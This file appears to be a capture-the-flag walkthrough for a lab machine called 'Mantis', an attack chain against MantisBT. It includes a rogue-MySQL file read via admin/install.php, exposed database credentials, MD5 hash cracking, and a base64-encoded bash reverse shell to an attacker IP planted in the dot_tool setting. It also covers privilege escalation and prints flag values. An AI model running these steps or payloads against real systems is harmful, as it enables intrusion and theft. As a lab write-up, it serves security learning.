@@ -1,0 +1,180 @@
+																							    Mantis Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.204
+export IP=192.168.68.204
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+80/tcp   open  http
+3306/tcp open  mysql
+
+nmap -Pn -n -sC -sV -p80,3306 $IP --open --stats-every=5s -oN results.txt
+
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Slick - Bootstrap 4 Template
+3306/tcp open  mysql   MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+ http-enum: 
+/css/
+/img/
+/js/
+nikto --url $IP
+ <!-- nothing -->
+ 
+Port 80 - Enumeration
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404 -t 30 "http://$IP/FUZZ" 
+
+/bugtracker
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404 -t 30 "http://$IP/bugtracker/FUZZ" 
+
+images
+library
+doc
+admin
+scripts
+css
+plugins
+core
+js
+api
+lang
+config
+vendor
+fonts
+
+# Let's check for some interesting details
+
+http://192.168.68.204/bugtracker/config/config_inc.php.sample
+
+# --- Database Configuration ---
+db_username = mantisdbuser
+db_password   = 
+database_name = bugtracker
+
+http://192.168.68.204/bugtracker/doc/en-US/Admin_Guide/Admin_Guide.txt
+
+MantisBT 2.0
+
+# when checking the login page, we notice a interesting warning
+
+Warning: "admin" directory should be removed, or access to it restricted.
+
+Le'ts enumerate the admin folder to see if you get anything interesting
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/bugtracker/admin/FUZZ"
+
+install.php
+
+http://192.168.68.204/bugtracker/admin/install.php      # since the admin folder and the php scripts inside it have not been disabled, let's use the exploit 
+
+# For successful exploitation, you need run special rogue MySQL server and connect to it from a server where you want to read files. Unfortunately, Mantis allows that.
+
+https://github.com/allyshka/Rogue-MySql-Server
+
+git clone https://github.com/allyshka/Rogue-MySql-Server.git
+cd Rogue-MySql-Server
+php roguemysql.php
+Enter filename to get [/etc/passwd] > /etc/passwd
+[.] Waiting for connection on 0.0.0.0:3306
+
+# Now that we have our mysql server opened, we need to trigger the exploit. Try to connect to MySQL server, but you can control $f_hostname variable through HTTP-request parameter hostname.
+
+http://$IP/bugtracker/admin/install.php?install=3&hostname=192.168.49.68
+
+php roguemysql.php
+Enter filename to get [/etc/passwd] > /etc/passwd
+[.] Waiting for connection on 0.0.0.0:3306
+[+] Connection from 192.168.68.204:50616 - greet... auth ok... some shit ok... want file... 
+[+] /etc/passwd from 192.168.68.204:50616:
+root:x:0:0:root:/root:/bin/bash
+-----------------------------------------
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mantis:x:1000:1000::/home/mantis:/bin/bash
+
+# Great, it works, now we know that the default configuration file was located in the /config directory.  /config/config_inc.php. 
+   All we need to do is to use the proper path, assuming the regular path is /var/www/html/bugtracker/config/config_inc.php, let's try to get the contents of it. You might have to play around with the path a little bit.
+   
+php roguemysql.php
+Enter filename to get [/etc/passwd] > /var/www/html/bugtracker/config/config_inc.php
+[.] Waiting for connection on 0.0.0.0:3306
+[+] Connection from 192.168.68.204:50608 - greet... auth ok... some shit ok... want file... 
+[+] /var/www/html/bugtracker/config/config_inc.php from 192.168.68.204:50608:
+<?php
+$g_hostname               = 'localhost';
+$g_db_type                = 'mysqli';
+$g_database_name          = 'bugtracker';
+$g_db_username            = 'root';
+$g_db_password            = 'SuperSequelPassword';
+
+
+# Now that we've got the credentials, let's try to login on the database remotely!
+
+mysql -u root -p -h $IP
+SuperSequelPassword
+
+show databases;
+use bugtracker;
+show tables;
+select * from mantis_user_table;
+administrator | c7870d0b102cfb2f4916ff04e47b5c6f
+
+hash-identifier c7870d0b102cfb2f4916ff04e47b5c6f    
+MD5
+
+john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+prayingmantis
+
+# Let's try the credentials on the web portal. We're in boys!
+   Aparently there is a known issues available at https://www.mantisbt.org/bugs/view.php?id=26091 CVE-2019-1571
+
+Step 1:   
+Navigate to Manage → Manage Configuration → Configuration Report → Create Configuration Options
+Set the configuration option titled "relationship_graph_enable" and assign it an "integer" value of "1".
+
+Step 2:  
+Create another configuration, this time called 'dot_tool' and assign it a "string" value with the following payload
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjY4LzQ0NDQgMD4mMQ== | base64 -d | /bin/bash;                    # bash -i >& /dev/tcp/192.168.49.68/4444 0>&1
+
+Step 3:
+Set up a listener
+nc -lvnp 4444 
+
+Step 4:
+Trigger the exploit by visiting http://192.168.68.204/bugtracker/workflow_graph_img.php
+
+Got shell!
+
+cd /home/mantis
+cat local.txt                         # Flag: 1ab2d55f3b20b58bf86f9ddac9315580
+
+
+Privilege escalation
+
+# Running linpeas, interesting things
+
+/etc/cron.d/db_backup
+-rw-r--r--   1 root root   58 May 17  2022 db_backup
+
+# running pspy64, leave it running for at least 4-5 minutes
+
+mysqldump -u bugtracker -pBugTracker007 bugtracker          #  credential reuse! remember??
+
+su mantis
+BugTracker007
+
+sudo -l
+(ALL : ALL) ALL
+sudo su
+#whoami
+root
+cd /root
+cat proof.txt     #  Flag: dac3007cde050581a6fb34d4e17492f6
